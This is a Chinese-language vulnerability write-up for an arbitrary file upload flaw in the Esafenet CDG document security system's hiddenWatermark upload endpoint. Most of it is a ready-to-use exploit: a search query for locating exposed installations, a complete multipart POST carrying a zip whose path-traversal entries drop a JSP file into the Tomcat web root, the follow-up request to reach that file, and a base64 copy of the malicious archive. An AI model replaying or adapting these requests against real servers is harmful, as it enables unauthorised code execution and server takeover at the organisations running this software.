# 亿赛通电子文档安全管理系统hiddenWatermark任意文件上传漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统hiddenWatermark接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1706170000549-fdc86adb-1d49-443d-b3db-0a49c1a9ff04.png](./img/FyM5yALfE7nhduda/1706170000549-fdc86adb-1d49-443d-b3db-0a49c1a9ff04-328737.png)

# 四、漏洞复现
```plain
POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 2190
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3lm0J8uEuFHxy191
Origin: null
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-Ip: 127.0.0.1

------WebKitFormBoundary3lm0J8uEuFHxy191
Content-Disposition: form-data; name="doc"; filename="jskdjks.zip"
Content-Type: application/zip

PK     {L9X               ../PK     {L9X               ../../PK     {L9X            	   ../../../PK     {L9X               ../../../../PK     {L9X               ../../../../../PK     {L9X               ../../../../../tomcat/PK     {L9X               ../../../../../tomcat/webapps/PK     {L9X            #   ../../../../../tomcat/webapps/ROOT/PK     tL9X               theme/theme/PK     XL9X               theme/PK    gL9X_l�lS   h      theme/theme/theme1.xml=�1
�0����f���S\\�t�P0"M&Ż[�:���u�;aH+M�	Z�
�t<�/��(;��2mj�c��&�s�C�oPK   
L9X            /   ../../../../../tomcat/webapps/ROOT/uuidc251.jsp�M�@Ы�!��h����dM��|њff
\ߟ�{�*-ιht��mN�n��͡�>b۽d�ă��lz���Bl�����wCY
�o"�	_!P_]>PK��d   j   PK?      {L9X             $              ../
          4w�.O�                PK?      {L9X             $          !   ../../
          4w�.O�                PK?      {L9X            	 $          E   ../../../
          4w�.O�                PK?      {L9X             $          l   ../../../../
          4w�.O�                PK?      {L9X             $          �   ../../../../../
          4w�.O�                PK?      {L9X             $          �   ../../../../../tomcat/
          4w�.O�                PK?      {L9X             $          �   ../../../../../tomcat/webapps/
          4w�.O�                PK?      {L9X            # $          3  ../../../../../tomcat/webapps/ROOT/
          4w�.O�                PK?      tL9X             $          t  theme/theme/
         A��.O�                PK?      XL9X             $          �  theme/
         �î.O�                PK?     gL9X_l�lS   h    $           �  theme/theme/theme1.xml
         ��z�.O�                PK    
L9X��d   j   / $           I  ../../../../../tomcat/webapps/ROOT/uuidc251.jsp
          1 Z.O�                PK      �  
    
------WebKitFormBoundary3lm0J8uEuFHxy191--
```

![1706170038775-4f207230-376a-4d5e-a844-644994cad927.png](./img/FyM5yALfE7nhduda/1706170038775-4f207230-376a-4d5e-a844-644994cad927-004049.png)

上传文件位置

```plain
GET /uuidc251.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate

```

![1706170065519-c6f42878-4c0f-427e-a564-e1c8fae2191b.png](./img/FyM5yALfE7nhduda/1706170065519-c6f42878-4c0f-427e-a564-e1c8fae2191b-636776.png)

上传文件

```plain
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
```

![1706170139009-68f0c084-b90f-46de-9f2d-b723cb05ca7d.png](./img/FyM5yALfE7nhduda/1706170139009-68f0c084-b90f-46de-9f2d-b723cb05ca7d-634341.png)

[output_base64Datazip.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/1622799/1713621691107-6ebadbd1-065c-4f7a-98a9-103bd647a7af.zip)

![1706170185867-35633274-6b47-4484-9de3-b007c2482f96.png](./img/FyM5yALfE7nhduda/1706170185867-35633274-6b47-4484-9de3-b007c2482f96-250986.png)

![1706170197368-0d287ff9-5744-49ee-8a90-c0d1ca6f652b.png](./img/FyM5yALfE7nhduda/1706170197368-0d287ff9-5744-49ee-8a90-c0d1ca6f652b-791108.png)

[亿赛通电子文档安全管理系统-uploadfile-任意文件上传.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1713621691348-eefa6232-51fe-43e9-b815-c9196642bc17.yaml)



> 更新: 2024-04-20 22:01:30  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xl7p8vv07etff80c>